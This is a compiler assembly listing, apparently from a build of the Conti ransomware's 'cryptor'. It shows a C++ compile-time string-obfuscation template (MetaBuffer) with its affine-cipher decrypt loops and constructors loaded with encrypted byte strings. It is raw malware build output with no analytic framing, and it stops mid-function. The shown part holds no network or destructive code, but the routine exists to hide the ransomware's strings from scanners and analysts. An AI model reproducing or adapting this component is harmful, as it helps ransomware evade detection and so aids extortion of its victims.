;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 5b	 sub	 ecx, 91			; 0000005bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2e	 mov	 BYTE PTR [rcx+1], 46	; 0000002eH
  00007	c6 41 02 5b	 mov	 BYTE PTR [rcx+2], 91	; 0000005bH
  0000b	c6 41 03 7d	 mov	 BYTE PTR [rcx+3], 125	; 0000007dH
  0000f	c6 41 04 5b	 mov	 BYTE PTR [rcx+4], 91	; 0000005bH
  00013	c6 41 05 7d	 mov	 BYTE PTR [rcx+5], 125	; 0000007dH
  00017	c6 41 06 5b	 mov	 BYTE PTR [rcx+6], 91	; 0000005bH
  0001b	c6 41 07 23	 mov	 BYTE PTR [rcx+7], 35	; 00000023H
  0001f	c6 41 08 5b	 mov	 BYTE PTR [rcx+8], 91	; 0000005bH
  00023	c6 41 09 5b	 mov	 BYTE PTR [rcx+9], 91	; 0000005bH
  00027	c6 41 0a 5b	 mov	 BYTE PTR [rcx+10], 91	; 0000005bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 34 00 00
	00		 mov	 r10d, 52		; 00000034H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 44 00 00 00	 mov	 eax, 68			; 00000044H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 45	 mov	 BYTE PTR [rcx+1], 69	; 00000045H
  00007	c6 41 02 44	 mov	 BYTE PTR [rcx+2], 68	; 00000044H
  0000b	c6 41 03 61	 mov	 BYTE PTR [rcx+3], 97	; 00000061H
  0000f	c6 41 04 44	 mov	 BYTE PTR [rcx+4], 68	; 00000044H
  00013	c6 41 05 7e	 mov	 BYTE PTR [rcx+5], 126	; 0000007eH
  00017	c6 41 06 44	 mov	 BYTE PTR [rcx+6], 68	; 00000044H
  0001b	c6 41 07 64	 mov	 BYTE PTR [rcx+7], 100	; 00000064H
  0001f	c6 41 08 44	 mov	 BYTE PTR [rcx+8], 68	; 00000044H
  00023	c6 41 09 6d	 mov	 BYTE PTR [rcx+9], 109	; 0000006dH
  00027	c6 41 0a 44	 mov	 BYTE PTR [rcx+10], 68	; 00000044H
  0002b	c6 41 0b 1c	 mov	 BYTE PTR [rcx+11], 28
  0002f	c6 41 0c 44	 mov	 BYTE PTR [rcx+12], 68	; 00000044H
  00033	c6 41 0d 7d	 mov	 BYTE PTR [rcx+13], 125	; 0000007dH
  00037	c6 41 0e 44	 mov	 BYTE PTR [rcx+14], 68	; 00000044H
  0003b	c6 41 0f 76	 mov	 BYTE PTR [rcx+15], 118	; 00000076H
  0003f	c6 41 10 44	 mov	 BYTE PTR [rcx+16], 68	; 00000044H
  00043	c6 41 11 67	 mov	 BYTE PTR [rcx+17], 103	; 00000067H
  00047	c6 41 12 44	 mov	 BYTE PTR [rcx+18], 68	; 00000044H
  0004b	c6 41 13 36	 mov	 BYTE PTR [rcx+19], 54	; 00000036H
  0004f	c6 41 14 44	 mov	 BYTE PTR [rcx+20], 68	; 00000044H
  00053	c6 41 15 4a	 mov	 BYTE PTR [rcx+21], 74	; 0000004aH
  00057	c6 41 16 44	 mov	 BYTE PTR [rcx+22], 68	; 00000044H
  0005b	c6 41 17 1c	 mov	 BYTE PTR [rcx+23], 28
  0005f	c6 41 18 44	 mov	 BYTE PTR [rcx+24], 68	; 00000044H
  00063	c6 41 19 6d	 mov	 BYTE PTR [rcx+25], 109	; 0000006dH
  00067	c6 41 1a 44	 mov	 BYTE PTR [rcx+26], 68	; 00000044H
  0006b	c6 41 1b 7d	 mov	 BYTE PTR [rcx+27], 125	; 0000007dH
  0006f	c6 41 1c 44	 mov	 BYTE PTR [rcx+28], 68	; 00000044H
  00073	c6 41 1d 4b	 mov	 BYTE PTR [rcx+29], 75	; 0000004bH
  00077	c6 41 1e 44	 mov	 BYTE PTR [rcx+30], 68	; 00000044H
  0007b	c6 41 1f 02	 mov	 BYTE PTR [rcx+31], 2
  0007f	c6 41 20 44	 mov	 BYTE PTR [rcx+32], 68	; 00000044H
  00083	c6 41 21 53	 mov	 BYTE PTR [rcx+33], 83	; 00000053H
  00087	c6 41 22 44	 mov	 BYTE PTR [rcx+34], 68	; 00000044H
  0008b	c6 41 23 67	 mov	 BYTE PTR [rcx+35], 103	; 00000067H
  0008f	c6 41 24 44	 mov	 BYTE PTR [rcx+36], 68	; 00000044H
  00093	c6 41 25 19	 mov	 BYTE PTR [rcx+37], 25
  00097	c6 41 26 44	 mov	 BYTE PTR [rcx+38], 68	; 00000044H
  0009b	c6 41 27 1c	 mov	 BYTE PTR [rcx+39], 28
  0009f	c6 41 28 44	 mov	 BYTE PTR [rcx+40], 68	; 00000044H
  000a3	c6 41 29 56	 mov	 BYTE PTR [rcx+41], 86	; 00000056H
  000a7	c6 41 2a 44	 mov	 BYTE PTR [rcx+42], 68	; 00000044H
  000ab	c6 41 2b 64	 mov	 BYTE PTR [rcx+43], 100	; 00000064H
  000af	c6 41 2c 44	 mov	 BYTE PTR [rcx+44], 68	; 00000044H
  000b3	c6 41 2d 05	 mov	 BYTE PTR [rcx+45], 5
  000b7	c6 41 2e 44	 mov	 BYTE PTR [rcx+46], 68	; 00000044H
  000bb	c6 41 2f 67	 mov	 BYTE PTR [rcx+47], 103	; 00000067H
  000bf	c6 41 30 44	 mov	 BYTE PTR [rcx+48], 68	; 00000044H
  000c3	c6 41 31 02	 mov	 BYTE PTR [rcx+49], 2
  000c7	c6 41 32 44	 mov	 BYTE PTR [rcx+50], 68	; 00000044H
  000cb	c6 41 33 44	 mov	 BYTE PTR [rcx+51], 68	; 00000044H
  000cf	c6 41 34 44	 mov	 BYTE PTR [rcx+52], 68	; 00000044H
  000d3	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000d7	48 8b c1	 mov	 rax, rcx
  000da	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 1a 00 00
	00		 mov	 r11d, 26
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 73	 sub	 ecx, 115		; 00000073H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 33	 imul	 r8d, ecx, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 29	 mov	 BYTE PTR [rcx+1], 41	; 00000029H
  00007	c6 41 02 73	 mov	 BYTE PTR [rcx+2], 115	; 00000073H
  0000b	c6 41 03 11	 mov	 BYTE PTR [rcx+3], 17
  0000f	c6 41 04 73	 mov	 BYTE PTR [rcx+4], 115	; 00000073H
  00013	c6 41 05 4f	 mov	 BYTE PTR [rcx+5], 79	; 0000004fH
  00017	c6 41 06 73	 mov	 BYTE PTR [rcx+6], 115	; 00000073H
  0001b	c6 41 07 45	 mov	 BYTE PTR [rcx+7], 69	; 00000045H
  0001f	c6 41 08 73	 mov	 BYTE PTR [rcx+8], 115	; 00000073H
  00023	c6 41 09 34	 mov	 BYTE PTR [rcx+9], 52	; 00000034H
  00027	c6 41 0a 73	 mov	 BYTE PTR [rcx+10], 115	; 00000073H
  0002b	c6 41 0b 45	 mov	 BYTE PTR [rcx+11], 69	; 00000045H
  0002f	c6 41 0c 73	 mov	 BYTE PTR [rcx+12], 115	; 00000073H
  00033	c6 41 0d 72	 mov	 BYTE PTR [rcx+13], 114	; 00000072H
  00037	c6 41 0e 73	 mov	 BYTE PTR [rcx+14], 115	; 00000073H
  0003b	c6 41 0f 4f	 mov	 BYTE PTR [rcx+15], 79	; 0000004fH
  0003f	c6 41 10 73	 mov	 BYTE PTR [rcx+16], 115	; 00000073H
  00043	c6 41 11 5b	 mov	 BYTE PTR [rcx+17], 91	; 0000005bH
  00047	c6 41 12 73	 mov	 BYTE PTR [rcx+18], 115	; 00000073H
  0004b	c6 41 13 40	 mov	 BYTE PTR [rcx+19], 64	; 00000040H
  0004f	c6 41 14 73	 mov	 BYTE PTR [rcx+20], 115	; 00000073H
  00053	c6 41 15 63	 mov	 BYTE PTR [rcx+21], 99	; 00000063H
  00057	c6 41 16 73	 mov	 BYTE PTR [rcx+22], 115	; 00000073H
  0005b	c6 41 17 7c	 mov	 BYTE PTR [rcx+23], 124	; 0000007cH
  0005f	c6 41 18 73	 mov	 BYTE PTR [rcx+24], 115	; 00000073H
  00063	c6 41 19 73	 mov	 BYTE PTR [rcx+25], 115	; 00000073H
  00067	c6 41 1a 73	 mov	 BYTE PTR [rcx+26], 115	; 00000073H
  0006b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0006f	48 8b c1	 mov	 rax, rcx
  00072	c3		 ret	 0
??0?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
